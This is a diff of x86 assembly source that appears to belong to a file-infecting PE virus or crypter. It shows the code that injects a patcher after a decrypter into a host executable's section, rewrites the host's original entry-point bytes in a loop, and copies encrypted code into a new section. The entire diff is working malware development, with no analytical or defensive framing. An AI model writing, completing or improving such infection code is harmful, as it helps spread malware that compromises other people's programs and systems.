@@ -85,6 +85,40 @@ nop
 nop
 nop
 nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
 endPatcher:
 
 ; Jmp data
@@ -581,34 +615,52 @@ PATCHER_SIZE = 17
 ; mov eax, 4bytes
 ; stosd
 ; ...
-mov	edi, [DELTA PeFileMap]
+mov	ecx, PATCH_SIZE
+mov	edi, [DELTA PeFileMap] ; Destination bytes
 add	edi, [DELTA PointerToRawData]
 add	edi, DECRYPTER_SIZE ; After decrypter add our patch
-mov	eax, 0B8h ; Mov eax, imm32
+mov	esi, [DELTA OldEntryPoint] ; Source bytes
+add	esi, [DELTA BaseImage] ; Base + Old EP
+mov	eax, 0BFh ; Mov edi, imm32
 stosb
-mov	eax, [DELTA OldEntryPoint]
-add	eax, [DELTA BaseImage] ; Base + Old EP
+mov	eax, esi
+patchNewDword:
+mov	eax, 0B8h ; mov eax, imm32
+stosb
+lodsd
 stosd
-mov	eax, 000C7h ; Mov dword ptr [eax], imm32
-stosw
-; Get first 4 bytes to repatch
-mov	ebx, [DELTA PeFileMap]
-add	ebx, [DELTA CodeSecRawData]
-add	ebx, [DELTA OffsetCodeSecEP]
-mov	eax, offset OffsetCodeSecEP
-mov	eax, OffsetCodeSecEP
-mov	eax, [ebx]
-stosd
-; Patch the last byte
-mov	eax, 0C083h ; Add eax
-stosw
-mov	eax, 04h
+mov	eax, 0ABh ; stosd
 stosb
-mov	eax, 000C6h ; Mov byte ptr [eax], imm8
-stosw
-add	ebx, 4
-mov	al, [ebx]
-stosb
+sub	ecx, 4
+cmp	ecx, 0	
+jg	patchNewDword
+
+
+; mov	eax, 0B8h ; Mov eax, imm32
+; stosb
+; mov	eax, [DELTA OldEntryPoint]
+; add	eax, [DELTA BaseImage] ; Base + Old EP
+; stosd
+; mov	eax, 000C7h ; Mov dword ptr [eax], imm32
+; stosw
+; ; Get first 4 bytes to repatch
+; mov	ebx, [DELTA PeFileMap]
+; add	ebx, [DELTA CodeSecRawData]
+; add	ebx, [DELTA OffsetCodeSecEP]
+; mov	eax, offset OffsetCodeSecEP
+; mov	eax, OffsetCodeSecEP
+; mov	eax, [ebx]
+; stosd
+; ; Patch the last byte
+; mov	eax, 0C083h ; Add eax
+; stosw
+; mov	eax, 04h
+; stosb
+; mov	eax, 000C6h ; Mov byte ptr [eax], imm8
+; stosw
+; add	ebx, 4
+; mov	al, [ebx]
+; stosb
 
 ; INSERTING NEW SECTION - OPCODE COPY WITH ENCRYPTION
 mov	ecx, endInject - endPatcher
